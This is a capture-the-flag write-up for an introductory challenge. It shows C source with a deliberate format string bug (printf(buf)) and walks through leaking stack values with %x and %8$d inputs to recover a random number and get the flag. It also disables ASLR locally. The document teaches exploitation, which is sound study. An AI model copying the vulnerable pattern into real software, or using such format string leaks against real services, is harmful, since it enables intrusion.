---
title: ZKP - Zero Knowledge Proofs
date: 2017-06-09 10:00 UTC
tags:
  - ctf
  - pwn
  - binary
  - format string
---

- [zkp.c](2017-06-09-zkp-zero-knowledge-proofs/zkp.c)

Please don't try to wreak my website :).

Solution
--------

A binary is given, a source file is given, which I especially like to display
using my fancy new syntax highlighter, so I will post here as well even though
the link is already specified.

~~~ c
/* 
    ZKP : Zero Knwoledge Proof (https://en.wikipedia.org/wiki/Zero-knowledge_proof#Abstract_example)

    In this example, Peggy knows the secret word to open a magical door in a cave.
    This door interconnects all the entrances to the cave. The cave has 2 ** 32
    entrances. Thus knowing the secret word allows Peggy to move between all the 
    entrances and go in and come out from whichever one she wants.

    Peggy wants to convince Victor that she knows this word without revealing to him, 
    the secret word. I.E. She wants to convince Victor that she knows the work,
    giving him Zero Knowledge about the actual magic word.

    To do this, she devices a novel method.

    Peggy will go in through any entrance unknown to Victor. Victor will now shout
    a entrance number. The probhablity that Peggy has guessed the correct entrance
    is 2 ^ -32 

    Since this is such a negligible number, Victor will get convinced if Peggy is
    able to do this.

    Peggy is gone, and now, *you* want to convince Peggy that you know the secret word
    but you do not know the secret word. Can you still convince Victor?
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main(int argc, char const *argv[]) {
    int victor;
    int peggy;
    char buf[1024] = { 0 };

    int p;

    // Turn off output buffering so we can see output right away
    // not related to CTF lol :P
    setbuf(stdout, NULL);

    printf("Since Peggy is not present, we need you to substitute for her\n");
    printf("You do know the secret words right?\n");

    printf("Victor is making a choice.\n");
    
    // Victor generates a random number 
    int fd = open("/dev/urandom", O_RDONLY);
    read(fd, &victor, sizeof(int)) != sizeof(int);
    close(fd);

    // Allow Peggy to make her choices as many times as she wants until she is ready.
    int choice = 0;
    while(!choice) {
        printf("Enter Door : \n");
        fgets(buf, sizeof(buf), stdin);
        peggy = strtol(buf, NULL, 10);

        printf("You entered : ");
        printf(buf);
        printf("\n");

        printf("Are you sure? (y/n)\n");

        fgets(buf, sizeof(buf), stdin);        
        choice = buf[0] == 'y';
    }

    if (victor != peggy) {
        printf("Victor has caught you cheating in the act.\n");
        return -1;
    }
    
    printf("Victor is now convinced that you know the secret word for the door\n");
    printf("He gives you the flag\n");
    system("cat ./flag.txt");   

    return 0;
}
~~~

Let us examine the binary and see what it wants to do. It will 

- Generate a random number
- Loop until a you make a choice by pressing 'y'
- In the loop, read string from you, and print it back to you asking for confirmation.

The bug here is pretty obvious. You do a printf(buf). Which means that you can
do a format string attack. 

Format string attacks are pretty powerful, because they allow you to leak memory
from the application and also to override the values from arbritary memory locations.

The details of the attack are left as an exercise for the reader to find out, 
and as an introductory challenge, this is meant to inspire curiosity about `pwning`.

Let me play with the compiled binary to demonstrate the flaw and also to exploit it.

	$ gcc zkp.c
	zkp.c: In function ‘main’:
	zkp.c:61:16: warning: format not a string literal and no format arguments [-Wformat-security]
    	     printf(buf);
        	        ^

You can see, that GCC complains about our bug as soon as it sees it. 

	$ ./a.out
	Since Peggy is not present, we need you to substitute for her
	You do know the secret words right?
	Victor is making a choice.
	Enter Door : 
	123 
	You entered : 123

	Are you sure? (y/n)
	y
	Victor has caught you cheating in the act.

This seems like a pretty normal execution of the program. It did as expected. 
123 was apparently not the random number it wanted. 

Let us give it something a bit more fancier now. 

	$ ./a.out
	Since Peggy is not present, we need you to substitute for her
	You do know the secret words right?
	Victor is making a choice.
	Enter Door : 
	0x%x 0x%x 0x%x 0x%x
	You entered : 0xbaa87ef0 0xe1a2d780 0xe175e6e0 0xe1c26700

	Are you sure? (y/n)
	y
	Victor has caught you cheating in the act.

Huh? What is this? How did we get hexadecimal values? 

The way printf() works in the low level is that it copies over arguments that
you give and simply push it into the stack. What stack? The progam stack. The 
thing which the ESP CPU register is pointing to. 

The values are all read off the stack from the first argument of the printf.
Called a `format string`. The format string describes how many elements are to
be read off the top of this stack and how they are to be printed.

Normally you'd use a python script to be able to send binary / custom crafted
inputs to this binary so that you are able to manipulate this to doing what you
want it to do. 

In our case, we have a simple enogh binary that I do not do it. I simply formulate
a plan of how to win this challenge and get the plan. 

The binary will give me the flag if I am able to `guess` the random number that
Victor picks. So that is what I will do. I will use this format string exploit to
find out what the random number generated is. 

But how do I do that? 

I can make a informed guess (I actually designed the binary in that way), that
this random value will be somewhere in the stack too, and I should be able to 
simply leak the values. 

So let me just go ahead and leak some of the values. 

	$ ./a.out
	Since Peggy is not present, we need you to substitute for her
	You do know the secret words right?
	Victor is making a choice.
	Enter Door : 
	%x %x %x %x %x %x %x %x %x %x %x
	You entered : 7eda46c0 190b7780 18de86e0 192b0700 e 7eda7268 7eda6dc8 dc4225bb 0 25207825 20782520

	Are you sure? (y/n)
	y
	Victor has caught you cheating in the act.


	$ ./a.out
	Since Peggy is not present, we need you to substitute for her
	You do know the secret words right?
	Victor is making a choice.
	Enter Door : 
	%x %x %x %x %x %x %x %x %x %x %x
	You entered : c30d8250 bc30a780 bc03b6e0 bc503700 e c30dadf8 c30da958 e5296f91 0 25207825 20782520

	Are you sure? (y/n)
	y
	Victor has caught you cheating in the act.


Eh? We get a different value each time? Ignoring the few fields that do end up
being common to both inputs, the rest are all wrong. There is too much entropy
in the system. 

This is due to ASLR or Address Space Layout Randomization. This in a nutshell
changes the in-memory layout of our binary each time, making exploits more 
difficult to make. 

Sure, we can use GDB and figure it out, but that is not the point here. 

ASLR was disabled in the pwn service on the server too. So that is that. 

	$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
	[sudo] password for parth: 
	0

That should patch it up. 

	$ ./a.out
	Since Peggy is not present, we need you to substitute for her
	You do know the secret words right?
	Victor is making a choice.
	Enter Door : 
	%x %x %x %x %x %x %x %x %x %x %x
	You entered : ffffb160 f7dd3780 f7b046e0 f7fc8700 e ffffdd08 ffffd868 403457e2 0 25207825 20782520

	Are you sure? (y/n)
	y
	Victor has caught you cheating in the act.

	parth at Saphira in /tmp 
	$ ./a.out
	Since Peggy is not present, we need you to substitute for her
	You do know the secret words right?
	Victor is making a choice.
	Enter Door : 
	%x %x %x %x %x %x %x %x %x %x %x
	You entered : ffffb160 f7dd3780 f7b046e0 f7fc8700 e ffffdd08 ffffd868 d31389f4 0 25207825 20782520

	Are you sure? (y/n)
	y
	Victor has caught you cheating in the act.

There we go. Much more deterministic.

It is interesting to note that all our arguments are now constant except for one.
Could that actually be the random number that the binary generates for Victor?

And yes, it is. The problem was designed such that it is. 

So we now have a way to leak the exact random number and completly pwn the binary.

So, let me do that. 

Since the differnet hex appears as the 8th item on the stack, and computing the
size of the input payload itself, we finally use the `%{number}${modifier}` syntax
to simply leak the exact number directly. We use `%8$d` to convert it to an integer
which is what we want.

	$ ./a.out
	Since Peggy is not present, we need you to substitute for her
	You do know the secret words right?
	Victor is making a choice.
	Enter Door : 
	%8$d
	You entered : 1053312746

	Are you sure? (y/n)
	n
	Enter Door : 
	1053312746
	You entered : 1053312746

	Are you sure? (y/n)
	y
	Victor is now convinced that you know the secret word for the door
	He gives you the flag
	flag{format string attacks are fun eh?}

We get the flag. flag{format string attacks are fun eh?}

Flag
----
flag{format string attacks are fun eh?}
